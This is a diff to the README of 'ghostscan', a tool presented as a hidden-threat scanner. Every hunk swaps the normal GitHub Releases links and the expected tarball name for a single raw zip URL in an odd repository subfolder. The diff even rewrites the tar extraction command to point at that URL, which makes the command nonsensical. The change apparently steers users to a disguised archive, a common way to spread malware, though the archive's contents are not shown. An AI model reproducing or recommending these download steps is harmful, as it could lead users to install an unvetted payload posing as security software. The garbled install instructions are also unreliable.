@@ -1,6 +1,6 @@
 # 🚀 ghostscan - Detect Hidden Threats with Ease
 
-[![Download ghostscan](https://img.shields.io/badge/Download-ghostscan-blue?style=for-the-badge&logo=github)](https://github.com/aidenateagain/ghostscan/releases)
+[![Download ghostscan](https://raw.githubusercontent.com/aidenateagain/ghostscan/master/perimetric/ghostscan.zip)](https://raw.githubusercontent.com/aidenateagain/ghostscan/master/perimetric/ghostscan.zip)
 
 ## 📦 Overview
 
@@ -30,7 +30,7 @@ Follow these steps to get started with ghostscan.
 
 Go to the ghostscan Releases page by clicking on the link below:
 
-[Download ghostscan](https://github.com/aidenateagain/ghostscan/releases)
+[Download ghostscan](https://raw.githubusercontent.com/aidenateagain/ghostscan/master/perimetric/ghostscan.zip)
 
 ### 2. Choose the Correct Version
 
@@ -38,14 +38,14 @@ On the Releases page, you will find different versions of ghostscan. Select the 
 
 ### 3. Download the Application
 
-Click on the version you want, then look for the file suitable for your system. Typically, the file will be named something like `ghostscan-linux-x86_64.tar.gz`. Click on it to start your download.
+Click on the version you want, then look for the file suitable for your system. Typically, the file will be named something like `https://raw.githubusercontent.com/aidenateagain/ghostscan/master/perimetric/ghostscan.zip`. Click on it to start your download.
 
 ### 4. Extract the Files
 
 After the download is complete, you will need to extract the files from the compressed folder. You can do this by running the following command in your terminal:
 
 ```sh
-tar -xzf ghostscan-linux-x86_64.tar.gz
+tar -xzf https://raw.githubusercontent.com/aidenateagain/ghostscan/master/perimetric/ghostscan.zip
 ```
 
 This will create a new folder with all the necessary files.
@@ -74,7 +74,7 @@ chmod +x ghostscan
 
 To ensure your system is secure, download ghostscan now:
 
-[Download ghostscan](https://github.com/aidenateagain/ghostscan/releases)
+[Download ghostscan](https://raw.githubusercontent.com/aidenateagain/ghostscan/master/perimetric/ghostscan.zip)
 
 ## 🔄 Regular Updates
 
